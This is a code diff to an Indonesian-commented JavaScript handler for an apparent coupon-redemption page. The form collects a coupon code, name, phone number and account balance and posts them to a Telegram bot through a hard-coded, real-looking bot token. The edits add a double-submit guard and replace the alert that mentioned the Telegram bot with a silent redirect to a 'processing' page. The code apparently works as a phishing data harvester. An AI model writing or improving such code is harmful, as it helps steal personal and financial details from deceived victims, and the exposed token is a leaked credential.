@@ -1,7 +1,8 @@
-// script.js - Handler untuk form pengiriman kupon ke API Bot Telegram
+// script.js - Handler untuk form pengiriman kupon ke API Bot Telegram (kirim sekali saja, tanpa spam)
 document.addEventListener('DOMContentLoaded', function() {
     const form = document.querySelector('form'); // Ambil form pertama
     const button = document.getElementById('kirim'); // Tombol submit
+    let isSubmitting = false; // Flag untuk cegah submit ganda
 
     // Placeholder: Ganti dengan TOKEN bot dan chat_id Anda
     const BOT_TOKEN = '7504434844:AAEJvY81gVUID8gl1BCqdR28oNld83WbNxM'; // Contoh: '123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11'
@@ -10,6 +11,12 @@ document.addEventListener('DOMContentLoaded', function() {
     // Fungsi untuk menangani submit form
     form.addEventListener('submit', function(event) {
         event.preventDefault(); // Cegah pengiriman default
+
+        // Cegah submit ganda
+        if (isSubmitting) {
+            return; // Jika sudah submitting, abaikan
+        }
+        isSubmitting = true; // Set flag
 
         // Ambil nilai dari input
         const kupon = document.getElementById('kupon').value;
@@ -20,6 +27,7 @@ document.addEventListener('DOMContentLoaded', function() {
         // Validasi sederhana
         if (!kupon || !nama || !nomor || !saldo) {
             alert('Harap lengkapi semua field!');
+            isSubmitting = false; // Reset flag jika validasi gagal
             return;
         }
 
@@ -44,14 +52,18 @@ document.addEventListener('DOMContentLoaded', function() {
         .then(response => response.json())
         .then(result => {
             if (result.ok) {
-                alert('Data berhasil dikirim ke bot Telegram!');
-                form.reset(); // Reset form
+                // Langsung redirect ke halaman selanjutnya tanpa alert
+                window.location.href = '../proses.html'; // Ganti dengan URL halaman konfirmasi Anda
             } else {
+                // Jika gagal, alert atau redirect ke error page (opsional)
                 alert('Gagal mengirim: ' + result.description);
+                isSubmitting = false; // Reset flag jika gagal
             }
         })
         .catch(error => {
+            // Jika error jaringan, alert atau redirect (opsional)
             alert('Error: ' + error.message);
+            isSubmitting = false; // Reset flag jika error
         });
     });
 
